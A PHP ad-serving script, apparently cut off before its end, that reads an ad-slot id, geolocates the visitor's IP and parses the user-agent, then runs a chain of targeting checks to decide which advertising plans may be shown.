<?php
header("Cache-Control: no-cache");
header("Pragma: no-cache");
header("Access-Control-Allow-Credentials: true");

error_reporting(0);
date_default_timezone_set('PRC');//校正时间

$start_timea = microtime(true);

require_once __DIR__ . '/17monipdb/Ipsearch.class.php';
$IpSearch = new IpSearch('qqzeng-ip-utf8.dat');

require_once __DIR__ . '/sredis.php';
$connectParam = array(
    'host'       => '127.0.0.1',
    'port'       => 6379,
    'password'   => '',
    'timeout'    => 1,
    'expire'     => 0,
    'persistent' => false,
    'prefix'     => '',);
$redis = new Redisutil($connectParam);


$host_ip = '127.0.0.1';
$password_redis = '';

$connectParam = array(
    'host'       => $host_ip,
    'port'       => 6379,
    'password'   => $password_redis,
    'timeout'    => 1,
    'expire'     => 0,
    'persistent' => false,
    'prefix'     => '',);
$sredis = new Redisutil($connectParam);
//redis切库
$week = date('w');
switch($week){
case 1:
    $redis->select(1);
    $sredis->select(1);
    break;
case 2:
    $redis->select(2);
    $sredis->select(2);
    break;
case 3:
    $redis->select(3);
    $sredis->select(3);
    break;
case 4:
    $redis->select(4);
    $sredis->select(4);
    break;
case 5:
    $redis->select(5);
    $sredis->select(5);
    break;
case 6:
    $redis->select(6);
    $sredis->select(6);
    break;
case 0:
    $redis->select(7);
    $sredis->select(7);
}

function dump($var, $echo = true, $label = null, $flags = ENT_SUBSTITUTE)
{

    $label = (null === $label) ? '' : rtrim($label) . ':';
    ob_start();
    var_dump($var);
    $output = ob_get_clean();
    $output = preg_replace('/\]\=\>\n(\s+)/m', '] => ', $output);
    if (false) {
        $output = PHP_EOL . $label . $output . PHP_EOL;
    } else {
        if (!extension_loaded('xdebug')) {
            $output = htmlspecialchars($output, $flags);
        }
        $output = '<pre>' . $label . $output . '</pre>';
    }
    if ($echo) {
        echo($output);
        return null;
    } else {
        return $output;
    }
}


function writeFile($file,$str,$mode='a+')
{
    // $oldmask = @umask(0);
    // $fp = @fopen($file,$mode);
    // // @flock($fp, 3);
    // if(!$fp){

    // } else {
    //     @fwrite($fp,$str);
    //     @fclose($fp);
    //     // @umask($oldmask);
    //     // Return true;
    // }
}
//统计专用写log
function writeFileForPv($file,$str,$mode='a+')
{
    $oldmask = @umask(0);
    $fp = @fopen($file,$mode);
    // @flock($fp, 3);
    if(!$fp){

    } else {
        @fwrite($fp,$str);
        @fclose($fp);
        // @umask($oldmask);
        // Return true;
    }
}



//conf
$cost_type = array('cpm', 'cpv');


//log
$log_test_file = 'slog.txt';
$log_test_str = ''.date('Y-m-d H:i:s').'';

//  解密 $_GET['id']
$getid = $_GET['id'];
//  id 是广告位 id
$id = addslashes($getid);
$id = htmlspecialchars($id);
$user_IP = GetIp();

$ipInfos = GetIpLookup($user_IP,$IpSearch);

//数据库连接信息
$db_link = $sredis->db_link;
$db_root = $sredis->db_root;
$db_password = $sredis->db_password;

$url = $sredis->curl_url;
$cilck_url = $sredis->cilck_url;
$sign = $sredis->sign;
try{
    $pdo = new PDO($db_link,$db_root,$db_password);
}catch(PDOException $e){
    // echo '数据库连接失败'.$e->getMessage();
}

// $pdo->setAttribute(PDO::ATTR_PERSISTENT,true);

$pdo->exec('set names utf8');
//手机型号,设置为全局变量，在计划筛选中用到
global $modle;
$modle = model();

//全局服务器配置地址
$globalSql = $pdo->prepare("select img_server,js_server,jump_server,adv_server,domain_limit,mycom from lz_setting");
$globalSql->execute();
$globalRes = $globalSql->fetchAll();

if (empty($globalRes[0])) {
    $log_test_str.=' ERROR10000'."\n";
    writeFile($log_test_file,$log_test_str);
    echo('服务器地址配置错误');
    exit;
}

//平台域名
$platformUrl = $globalRes[0]['jump_server'];
//获取当前网站域名
$user_site_url = !isset($_SERVER["HTTP_REFERER"]) ? '' : $_SERVER["HTTP_REFERER"];
$user_site_url = explode('/',$user_site_url);
$adsthisUrl = empty($user_site_url) ? '' : $user_site_url[2];

//图片服务器地址
$img_server = $globalRes[0]['img_server'];
$img_server = empty($img_server) ? $adsthisUrl : $img_server;

//查询广告位的相关信息
$adzLimitSql = $pdo->prepare("select adz_id,uid,htmlcontrol,minutes,adtpl_id,width,height,class_id,plan_class_allow,adz_type from lz_adzone where adz_id=?  AND status=1");
$adzLimitSql->execute(array($id));
$adzList = $adzLimitSql->fetchAll();
if (empty($adzList[0])) {
    $log_test_str.=' 广告位id'.$id.' ERROR10001'."\n";
    writeFile($log_test_file,$log_test_str);
    echo('广告位没有激活');
    exit;
}

//站长id
$uid = $adzList[0]['uid'];

// 查看当前域名属于哪个站长的
$userSql = $pdo->prepare("select  uid,domain_limit from lz_users_log WHERE uid=? ");
$userSql->execute(array($uid));
$userRes = $userSql->fetchAll();

/************************ 1. 网站域名限制 ***********************************/
// 该站长是否开启域名限制   0 默认 1 开启  2关闭 （默认就根据全局限制）
if ($userRes[0]['domain_limit'] == 0) {

    //全局  开启域名限制，则只有审核的网站可以显示广告 0 关闭 1开启
    if ($globalRes[0]['domain_limit'] == 0) {
        $siteRes = openDomainLimit($uid, $adsthisUrl, $pdo);
        //当前网站是否存在，不存在为空
        if (empty($siteRes)) {
            $siteRes[0] = array(
                "site_id" => 0,
                "uid" => 0,
                "siteurl" => 0,
                "web_deduction" => 0,
                "adv_deduction" => 0,
                'site_cnzz_id' => '',
            );
        }
        $domain_type = 2;
    } else {
        //站长下面所有的站都显示  开启限制
        $siteRes = openDomainLimit($uid, $adsthisUrl, $pdo);
        if (empty($siteRes)) {
            $log_test_str.=' 站长id'.$uid.' 广告投放的网站:'.$adsthisUrl.' ERROR10002'."\n";
            writeFile($log_test_file,$log_test_str);
            echo('该网站没有添加，域名被限制');
            exit;
        }
        $domain_type = 1;
    }
} elseif ($userRes[0]['domain_limit'] == 1) {
    //站长下面所有的站都显示  开启限制
    $siteRes = openDomainLimit($uid, $adsthisUrl, $pdo);

    if (empty($siteRes)) {
        $log_test_str.=' 站长id'.$uid.' 广告投放的网站:'.$adsthisUrl.' ERROR10003'."\n";
        writeFile($log_test_file,$log_test_str);
        echo('该网站没有添加，域名被限制');
        exit;
    }
    $domain_type = 1;
} else {
    $siteRes = openDomainLimit($uid, $adsthisUrl, $pdo);
    //当前网站是否存在，不存在为空
    if (empty($siteRes)) {
        $siteRes[0] = array(
            "site_id" => 0,
            "uid" => 0,
            "siteurl" => 0,
            "web_deduction" => 0,
            "adv_deduction" => 0,
            'site_cnzz_id' => '',
        );
    }
    $domain_type = 2;
}



/*********  2.得到所有可以展示的广告   **********/
//查询出该广告位所有可展示的广告
$ad_id_arr = $pdo->prepare("SELECT ad_id FROM lz_ads WHERE tpl_id=? AND width=? AND height=? AND status=1");
$ad_id_arr->execute(array($adzList[0]['adtpl_id'],$adzList[0]['width'],$adzList[0]['height']));
$ad_id_arr = $ad_id_arr->fetchAll();

//将查询出来的数据转换为字符串
$ad_id = '';
foreach($ad_id_arr as $key=>$value){
    $ad_id = $ad_id.','.$value['ad_id'];
}

$ad_id = substr($ad_id,1);
$adzList[0]['show_adid'] = $ad_id;
if (empty($ad_id)) {
    echo('无可展示的广告');
    exit;
}

//广告位选中的广告
$array_adid = explode(',',$adzList[0]['show_adid']);
$array_adid = array_filter($array_adid);

$ad_id = $adzList[0]['show_adid'];//提出key值，在转字符串  ad_id 广告id
$ad_id = rtrim($ad_id,',');

// 从s移到v==========================================================================================================================

if (!empty($adzList[0]['htmlcontrol'])) {
    @$style_htmlcontrol = unserialize($adzList[0]['htmlcontrol'])['position'];
} else {
    $style_htmlcontrol = '';
}

$styCss = isset($styCss) ? $styCss : '';
$adidArr = array();


if (!empty($adzList[0]['show_adid'])) {
    $adidArr = explode(',',$adzList[0]['show_adid']);
} else {
    $adidArr = '';
}

$limit_pid = '0';
$limit_new_pid = '';



// 广告位没有选择广告
if (empty($adidArr)) {
    $log_test_str.=' 广告位id'.$id.' ERROR10004'."\n";
    writeFile($log_test_file,$log_test_str);
    echo('该广告位下没有可投放的广告');
    exit;
}
// 用户所在省份和城市
$user_city = $ipInfos[2] . '-' . $ipInfos[3];
//获取手机操作系统
$agent = strtolower($_SERVER['HTTP_USER_AGENT']);
$is_pc = (stripos($agent, 'windows nt')) ? true : false;
$is_iphone = (stripos($agent, 'iphone')) ? true : false;
$is_ipad = (stripos($agent, 'ipad')) ? true : false;
$is_android = (stripos($agent, 'android')) ? true : false;
$is_wp = (stripos($agent, 'micromessenger')) ? true : false;  //微信
if($is_wp){
    $mobile = '0,4';  //微信
}else{
    if ($is_iphone||$is_ipad) {
        $mobile = '0,2';
    }elseif($is_android){
        $mobile = '0,3';
    }elseif($is_wp){
        $mobile = '0,4';
    }elseif($is_pc){
        $mobile = '0,1';
    }else{
        $mobile = '0';
    }
}

//得到激活ad的集合
$ad_sql = $pdo->prepare('SELECT a.ad_id,a.pid as adpid,a.priority AS adpriority,b.pid,b.restrictions,
b.priority,b.resuid,b.checkplan,b.sitelimit,b.limitsiteid,b.class_id,b.run_terminal,b.type FROM lz_ads AS a
LEFT JOIN lz_plan AS b ON a.pid = b.pid LEFT JOIN lz_users AS c ON a.uid = c.uid WHERE a.ad_id
IN (' . $ad_id . ') AND b.status = 1 AND a.status =1 AND b.run_terminal IN('.$mobile.') AND c.money > c.adv_money
AND b.delay_show_status !=1');
$ad_sql->execute(array());
$ad_sql_list = $ad_sql->fetchAll();

if (!empty($adzList[0]['uid'])) {
    $userid = $adzList[0]['uid'];   //广告位属于哪个站长id的
} else {
    $log_test_str.=' ERROR10005'."\n";
    writeFile($log_test_file,$log_test_str);
    echo('该广告位没有所属站长');
    exit;
}

$sites = $pdo->prepare("select site_id,uid,siteurl,class_id from lz_site WHERE siteurl=?");
$sites->execute(array($adsthisUrl));
$site_res = $sites->fetchAll();


/*********  4.计划十级限制   **********/
//广告位分类id
$adz_class_id = $adzList[0]['class_id'];
//广告位里面的计划分类
$adz_plan_class_allow = $adzList[0]['plan_class_allow'];
$i = 0;
foreach ($ad_sql_list as $key => $val) {

    if (!empty($ad_sql_list[$i]['pid'])) {
        //跳转计划
        $jumpPlan[$val['pid']] = $val['type'];

        $checkplanid = $ad_sql_list[$i]['pid'];

        // 获取当前广告的计划设置的投放限制和定向设置
        $checkplan = unserialize($ad_sql_list[$i]['checkplan']);

        // 查看限制站长id是否开启 状态
        $lim_uid_status = (int)$ad_sql_list[$i]['restrictions'];
        $checkplan['city']['isacl'] = (int)$checkplan['city']['isacl'];
        $checkplan['expire_date']['isdate'] = (int)$checkplan['expire_date']['isdate'];
        $checkplan['week']['isacl'] = (int)$checkplan['week']['isacl'];
        $checkplan['siteclass']['isacl'] = (int)$checkplan['siteclass']['isacl'];
        $checkplan['mobile']['isacl'] = (int)$checkplan['mobile']['isacl'];
        //广告位分类
        $checkplan['adzclass']['isacl'] = (int)$checkplan['adzclass']['isacl'];
        $checkplan['run_model']['isacl'] = (int)$checkplan['run_model']['isacl'];

        // 查看限制站长id 数组
        $lim_uid_array = explode(',', $ad_sql_list[$i]['resuid']);
        //今天 星级几 和 现在几时
        $week_day = (date('w') == 0) ? 7 : date('w');
        $day_hours = date('H');

        //限制网站  0 不限制 1 允许 2 屏蔽  和 网站id 数组
        $checkplan['sitelimit'] = (int)$ad_sql_list[$i]['sitelimit'];
        $checkplan['limitsiteid'] = explode(',', $ad_sql_list[$i]['limitsiteid']);
        //计划分类
        $checkplan['class_id'] = $ad_sql_list[$i]['class_id'];

        //广告位限制id
        if(isset($checkplan['adzlimit'])){
            $checkplan['adzlimit']['adzlimit'] = (int)$checkplan['adzlimit']['adzlimit'];
            $checkplan['adzlimit']['limitadzid'] = explode(',', $checkplan['adzlimit']['limitadzid']);
        }else{
            $checkplan['adzlimit']['adzlimit'] = 0;
            $checkplan['adzlimit']['limitadzid'] = '';
        }
    } else {
        $checkplan['expire_date']['isdate'] = '';
        $lim_uid_status = '';
        $checkplan['city']['isacl'] = '';
        $checkplan['week']['isacl'] = '';
        $checkplan['sitelimit'] = '';
        $checkplan['siteclass']['isacl'] = '';
        $checkplan['adzclass']['isacl'] = '';
    }

    //获取当前广告的计划是否到达结束日期 0 没有结束时间 1 有结束时间  $lim_uid_status 限制站长id 0 不限制 1允许 2 屏蔽
    if ($checkplan['expire_date']['isdate'] == 0 && $lim_uid_status == 0 && $checkplan['city']['isacl'] == 0 && $checkplan['week']['isacl'] == 0 && $checkplan['sitelimit'] == 0 && $checkplan['siteclass']['isacl'] == 0 && $checkplan['mobile']['isacl'] == 0 && $checkplan['run_model']['isacl'] == 0 && $checkplan['adzclass']['isacl'] == 0 && $checkplan['class_id'] == 0 && $checkplan['adzlimit']['adzlimit'] == 0) {
    } else {
        $time = strtotime(date('Y-m-d', time()));
        //结束时间 转时间戳
        $expireTime = strtotime($checkplan['expire_date']['year'] . '-' . $checkplan['expire_date']['month'] . '-' . $checkplan['expire_date']['day']);

        //时间状态为 0时，则没有结束时间限制
        if ($checkplan['expire_date']['isdate'] == 0) {
            // 站长限制 2级
            lim_webid_methods($lim_uid_status, $checkplan, $user_city, $week_day, $day_hours, $ad_sql_list, $i, $userid, $lim_uid_array, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow);

        } elseif (($expireTime - $time) >= 0 && $checkplan['expire_date']['isdate'] == 1) {
            // 站长限制 2级
            lim_webid_methods($lim_uid_status, $checkplan, $user_city, $week_day, $day_hours, $ad_sql_list, $i, $userid, $lim_uid_array, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow);

            //时间过期
        } else {
            $xianzhi_log_test=' 投放限制-结束日期不满足';

            //不满足条件的存cookies 存pid
            cookie_limit_pid($ad_sql_list, $i);
        }
    }
    $i++;

    unset($checkplan);
}


// 站长限制 2级
function lim_webid_methods($lim_uid_status, $checkplan, $user_city, $week_day, $day_hours, $ad_sql_list, $i, $userid, $lim_uid_array, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow)
{
    global $xianzhi_log_test;
    global $log_test_str ;

    // 0 不限制 1 允许 2 屏蔽
    if ($lim_uid_status == 0) {
        // 投放地域 3级
        lim_provincial_city_methods($checkplan, $user_city, $week_day, $day_hours, $ad_sql_list, $i, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow);

        //允许以下站长id (包含当前广告位对应的站长)
    } elseif ($lim_uid_status == 1 && in_array($userid, $lim_uid_array,true)) {
        // 投放地域 3级
        lim_provincial_city_methods($checkplan, $user_city, $week_day, $day_hours, $ad_sql_list, $i, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow);

        //允许以下站长（不包含当前广告位对应的站长）
    } elseif ($lim_uid_status == 1 && !in_array($userid, $lim_uid_array,true)) {

        // //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);

    } else {
        //屏蔽以下站长（不包含当前广告位对应的站长）
        if ($lim_uid_status == 2 && !in_array($userid, $lim_uid_array,true)) {
            // 投放地域 3级
            lim_provincial_city_methods($checkplan, $user_city, $week_day, $day_hours, $ad_sql_list, $i, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow);

        } else {
            $xianzhi_log_test=' 投放限制-站长限制不满足';
            //不满足条件的存cookies 存pid
            cookie_limit_pid($ad_sql_list, $i);
        }
    }
}

// 投放地域 3级
function lim_provincial_city_methods($checkplan, $user_city, $week_day, $day_hours, $ad_sql_list, $i, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow)
{
    global $xianzhi_log_test;
    global $ipInfos;
    // if (!empty($checkplan['city']['province'])) {
    //     for ($a = 0; $a < count($checkplan['city']['province']); $a++) {
    //         for ($b = 0; $b < count($checkplan['city']['data']); $b++) {
    //             $provincial_city[] = $checkplan['city']['province'][$a] . '-' . $checkplan['city']['data'][$b];
    //         }
    //     }
    // } else {
    //     $provincial_city = '';
    // }

    //投放地区限制 0 不限制 1 选择区域
    if ($checkplan['city']['isacl'] == 0) {
        // 周期日程 4级
        lim_week_methods($checkplan, $week_day, $day_hours, $ad_sql_list, $i, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow);

    } else {
        //选择区域 1 允许 0 拒绝 包含此地区
        if ($checkplan['city']['comparison'] == 1 && @in_array($ipInfos[3], $checkplan['city']['data'],true)) {
            // 周期日程 4级
            lim_week_methods($checkplan, $week_day, $day_hours, $ad_sql_list, $i, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow);

            //选择区域 1 允许 不包含此地区
        } elseif ($checkplan['city']['comparison'] == 1 && @!in_array($ipInfos[3], $checkplan['city']['data'],true)) {

            $xianzhi_log_test=' 定向设置-投放地域不满足';
            //不满足条件的存cookies 存pid
            cookie_limit_pid($ad_sql_list, $i);

            //选择区域 0 拒绝 不包含此地区
        } elseif ($checkplan['city']['comparison'] == 0 && @!in_array($ipInfos[3], $checkplan['city']['data'],true)) {

            // 周期日程 4级
            lim_week_methods($checkplan, $week_day, $day_hours, $ad_sql_list, $i, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow);

            //选择区域 0 拒绝 包含此地区
        } else {
            $xianzhi_log_test=' 定向设置-投放地域不满足';
            //不满足条件的存cookies 存pid
            cookie_limit_pid($ad_sql_list, $i);
        }
    }
}

// 周期日程 4级
function lim_week_methods($checkplan, $week_day, $day_hours, $ad_sql_list, $i, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow)
{
    global $xianzhi_log_test;
    //投放周期日程 0 不限制 1 限制
    if ($checkplan['week']['isacl'] == 0) {

        // 网站限制 5级
        lim_site_methods($checkplan, $siteRes, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

    } elseif ($checkplan['week']['isacl'] == 1 && !empty($checkplan['week']['data'][$week_day])) {
        //查看当前时间是否满足周期日程
        if (in_array($day_hours, $checkplan['week']['data'][$week_day]) == true) {

            // 网站限制 5级
            lim_site_methods($checkplan, $siteRes, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        } else {
            $xianzhi_log_test=' 定向设置-周期日程不满足';
            //不满足条件的存cookies 存pid
            cookie_limit_pid($ad_sql_list, $i);
        }
    } else {
        $xianzhi_log_test=' 定向设置-周期日程不满足';
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);
    }
}

// 网站限制 5级
function lim_site_methods($checkplan, $siteRes, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow)
{
    global $xianzhi_log_test;
    global $log_test_str;

    //网站限制 0 不限制
    if ($checkplan['sitelimit'] == 0) {

        // 网站类型 6级
        lim_siteclass_methods($checkplan, $siteRes, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        // 1允许 （包含当前广告位投放网站的id）
    } elseif ($checkplan['sitelimit'] == 1 && in_array($siteRes[0]['site_id'], $checkplan['limitsiteid'],true)) {

        // 网站类型 6级
        lim_siteclass_methods($checkplan, $siteRes, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        //1 允许 （不包含当前广告位投放网站的id）
    } elseif ($checkplan['sitelimit'] == 1 && !in_array($siteRes[0]['site_id'], $checkplan['limitsiteid'],true)) {

        $xianzhi_log_test=' 投放限制-网站限制不满足1';
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);

        //1 屏蔽 （不包含当前广告位投放网站的id）
    } elseif ($checkplan['sitelimit'] == 2 && !in_array($siteRes[0]['site_id'], $checkplan['limitsiteid'],true)) {

        // 网站类型 6级
        lim_siteclass_methods($checkplan, $siteRes, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        //2 屏蔽 （包含当前广告位投放网站的id）
    } else {
        $xianzhi_log_test=' 投放限制-网站限制不满足2';
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);
    }
}

// 网站类型 6级

function lim_siteclass_methods($checkplan, $siteRes, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow)
{
    global $xianzhi_log_test;
    //网站类型 0 不限 1 限制
    if ($checkplan['siteclass']['isacl'] == 0) {

        // 投放设备设置  7级
        lim_mobile_methods($checkplan, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        // 1允许 （包含当前广告位投放网站的分类）
    } elseif ($checkplan['siteclass']['choose'] == 1 && @in_array($siteRes[0]['class_id'], $checkplan['siteclass']['data'])) {

        // 投放设备设置  7级
        lim_mobile_methods($checkplan, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        // 1允许 （不包含当前广告位投放网站的分类）
    } elseif ($checkplan['siteclass']['choose'] == 1 && @!in_array($siteRes[0]['class_id'], $checkplan['siteclass']['data'])) {

        $xianzhi_log_test=' 定向设置-网站类型不满足';
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);

        // 0 拒绝 （不包含当前广告位投放网站的分类）
    } elseif ($checkplan['siteclass']['choose'] == 0 && @!in_array($siteRes[0]['class_id'], $checkplan['siteclass']['data'])) {

        // 投放设备设置  7级
        lim_mobile_methods($checkplan, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        // 0 拒绝 （包含当前广告位投放网站的分类）
    } else {
        $xianzhi_log_test=' 定向设置-网站类型不满足';
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);
    }
}


function writeFileaa($file,$str,$mode='a+')
{
    $oldmask = @umask(0);
    $fp = @fopen($file,$mode);
    // @flock($fp, 3);
    if(!$fp){

    } else {
        @fwrite($fp,$str);
        @fclose($fp);
    }
}

// 投放设备设置  7级
function lim_mobile_methods($checkplan, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow)
{




    global $xianzhi_log_test;

    $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    //分析数据
    $is_pc = (stripos($agent, 'windows nt')) ? true : false;
    $is_iphone = (stripos($agent, 'iphone')) ? true : false;
    $is_ipad = (stripos($agent, 'ipad')) ? true : false;
    $is_android = (stripos($agent, 'android')) ? true : false;
    // $is_wp = (stripos($agent, 'wp')) ? true : false;
    $is_wp = (stripos($agent, 'micromessenger')) ? true : false;  //微信

    $alog_test_file = 'aaalog.txt';
    $alog_test_str = "\n".''.$agent.'';



    if($is_wp){
        $mobile = 'wp';  //微信
    }else{
        if ($is_iphone||$is_ipad) {
            $mobile = 'ios';
        }elseif($is_pc){
            $mobile = 'pc';
        }elseif($is_wp){
            $mobile = 'wp';  //微信
        }elseif($is_android){
            $mobile = 'android';
        }else{
            $mobile = 'pc';
        }
    }

    //投放设备 0 不限 1 限制
    if ($checkplan['mobile']['isacl'] == 0) {

        //投放机型 8 级
        lim_run_model_methods($checkplan, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        // 1允许 （包含当前设备）
    } elseif ($checkplan['mobile']['isacl'] == 1 && @in_array($mobile, $checkplan['mobile']['data'],true)) {

        //投放机型 8 级
        lim_run_model_methods($checkplan, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        // 1允许 （不包含当前设备）
    } else {

        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);
    }


}

//投放机型 8 级
function lim_run_model_methods($checkplan, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow)
{



    global $modle;
    global $xianzhi_log_test;
    //投放机型 isacl:  0 不限制  1 指定终端
    if($checkplan['run_model']['isacl'] == 0){
        //广告位分类限制  9级
        lim_adzclass_methods($checkplan,$ad_sql_list, $i,$pdo,$adz_class_id,$adz_plan_class_allow);
    }else{

        //选择机型 1 允许 包含此机型
        if ($checkplan['run_model']['comparison_mobile'] == 1 && @in_array($modle,$checkplan['run_model']['modle_data'],true)) {
            //广告位分类限制  9级
            lim_adzclass_methods($checkplan,$ad_sql_list, $i,$pdo,$adz_class_id,$adz_plan_class_allow);

            //选择机型 1 允许 不包含此机型
        } elseif ($checkplan['run_model']['comparison_mobile'] == 1 && @!in_array($modle,$checkplan['run_model']['modle_data'],true)) {
            $xianzhi_log_test=' 投放机型不满足';
            //不满足条件的存cookies 存pid
            cookie_limit_pid($ad_sql_list, $i);

            //选择机型 0 拒绝 不包含此机型
        } elseif ($checkplan['run_model']['comparison_mobile'] == 0 && @!in_array($modle,$checkplan['run_model']['modle_data'],true)) {
            //广告位分类限制  9级
            lim_adzclass_methods($checkplan,$ad_sql_list, $i,$pdo,$adz_class_id,$adz_plan_class_allow);

            //选择机型 0 拒绝 包含此机型
        } else {
            $xianzhi_log_test=' 投放机型不满足';
            //不满足条件的存cookies 存pid
            cookie_limit_pid($ad_sql_list, $i);
        }
    }
}

//广告位分类限制 9 级
function lim_adzclass_methods($checkplan,$ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow)
{


    global $xianzhi_log_test;
    //广告位分类限制 0 不限 1 限制
    if ($checkplan['adzclass']['isacl'] == 0) {

        //广告位里面的计划分类限制 10 级
        lim_planclass_methods($checkplan,$ad_sql_list, $i,$adz_plan_class_allow);

        // 1允许 （包含当前广告位分类）
    } elseif ($checkplan['adzclass']['choose'] == 1 && @in_array($adz_class_id, $checkplan['adzclass']['data'])) {

        //广告位里面的计划分类限制 10 级
        lim_planclass_methods($checkplan,$ad_sql_list, $i,$adz_plan_class_allow);

        // 1允许 （不包含当前广告位分类）
    } elseif ($checkplan['adzclass']['choose'] == 1 && @!in_array($adz_class_id, $checkplan['adzclass']['data'])) {
        $xianzhi_log_test=' 定向设置-广告位分类不满足';
        cookie_limit_pid($ad_sql_list, $i);

        // 0 拒绝 （不包含当前广告位分类）
    } elseif ($checkplan['adzclass']['choose'] == 0 && @!in_array($adz_class_id, $checkplan['adzclass']['data'])) {

        //广告位里面的计划分类限制 10 级
        lim_planclass_methods($checkplan,$ad_sql_list, $i,$adz_plan_class_allow);
        // 0 拒绝 （包含当前广告位分类）
    } else {
        $xianzhi_log_test=' 定向设置-广告位分类不满足';
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);
    }

}

//广告位里面的计划分类限制 10 级
function lim_planclass_methods($checkplan,$ad_sql_list, $i,$adz_plan_class_allow)
{
    global $xianzhi_log_test;
    if(!empty($adz_plan_class_allow)){
        $adz_plan_class_allow = explode(',',$adz_plan_class_allow);
    }

    //广告位里面的计划分类限制 0 不限
    if ($checkplan['class_id'] == 0 || empty($adz_plan_class_allow)) {

        // 1允许 （广告位包含当前计划分类）
        lim_adzId_methods($checkplan,$ad_sql_list,$i,$adz_plan_class_allow);

    } elseif ($checkplan['class_id'] != 0 && @in_array($checkplan['class_id'], $adz_plan_class_allow)) {

        // 允许 （广告位不包含当前计划分类）
        lim_adzId_methods($checkplan,$ad_sql_list,$i,$adz_plan_class_allow);

    } else {
        $xianzhi_log_test=' 广告位不包含当前计划分类不满足';
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);
    }

}

//广告位id限制  11级
function lim_adzId_methods($checkplan,$ad_sql_list, $i,$adz_plan_class_allow)
{
    global $id;
    global $xianzhi_log_test;
    global $log_test_str;
    //广告位限制 0 不限制
    if ($checkplan['adzlimit']['adzlimit'] == 0) {
        // 1允许 （包含当前广告位投放广告位的id）
    } elseif ($checkplan['adzlimit']['adzlimit'] == 1 && in_array($id, $checkplan['adzlimit']['limitadzid'],true)) {
        //1 允许 （不包含当前广告位投放广告位的id）
    } elseif ($checkplan['adzlimit']['adzlimit'] == 1 && !in_array($id, $checkplan['adzlimit']['limitadzid'],true)) {
        $xianzhi_log_test=' 投放限制-广告位限制不满足1';
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);
        //1 屏蔽 （不包含当前广告位投放广告位的id）
    } elseif ($checkplan['adzlimit']['adzlimit'] == 2 && !in_array($id, $checkplan['adzlimit']['limitadzid'],true)) {
        //2 屏蔽 （包含当前广告位投放广告位的id）
    } else {
        $xianzhi_log_test=' 投放限制-广告位限制不满足2';
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);
    }
}

//获取手机型号
function model()
{
    //获取手机系统及型号
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    //返回值中是否有Android这个关键字
    if (stristr($_SERVER['HTTP_USER_AGENT'], 'Android') && stristr($user_agent, 'Build')) {
        $sub_end = stristr($user_agent, 'uild',true); //截取uild之前的字符串
        $sub_start = strripos($sub_end,';') + 2; //从;最后出现的位置 开始截取
        $sub_endnum = strripos($sub_end,'B'); //B最后一次出现的位置
        $sub_cha = ($sub_endnum - $sub_start) - 1; //截取几位
        $sub_results = substr($sub_end, $sub_start, $sub_cha);
        if(empty($sub_results)){
            $sub_results = 'Android';
        }
        return $sub_results;   //返回手机型号
    }elseif(stristr($_SERVER['HTTP_USER_AGENT'], 'Android')){
        return 'Android';
    }elseif(stristr($_SERVER['HTTP_USER_AGENT'], 'iPhone') || stristr($_SERVER['HTTP_USER_AGENT'], 'iPad') || stristr($_SERVER['HTTP_USER_AGENT'], 'iPod')){
        $sub_end = stristr($user_agent, 'ike',true); //截取like之前的字符串
        $sub_start = strripos($sub_end,'CPU') + 4; //从;最后出现的位置 开始截取
        $sub_endnum = strripos($sub_end,'l'); //L最后一次出现的位置
        $sub_cha = ($sub_endnum - $sub_start) - 1; //截取几位
        $sub_results = substr($sub_end, $sub_start, $sub_cha);
        if(empty($sub_results)){
            $sub_results = 'iPhone';
        }
        return $sub_results;   //返回手机型号
    }else{
        return 'win系统';
    }

}

// 存不满足条件的计划id
function cookie_limit_pid($ad_sql_list, $i)
{
    global $limit_pid;

    $limit_pid = $limit_pid . ',' . $ad_sql_list[$i]['pid'];
}

// 处理不满足条件的计划id
$array_pid = explode(',', $limit_pid);

// 去重
$array_pid = array_unique($array_pid);

$limit_pid = isset($limit_pid) ? $array_pid : 0;

// 用户IP
$uIP = GetIp();


// 从s移到v==========================================================================================================================


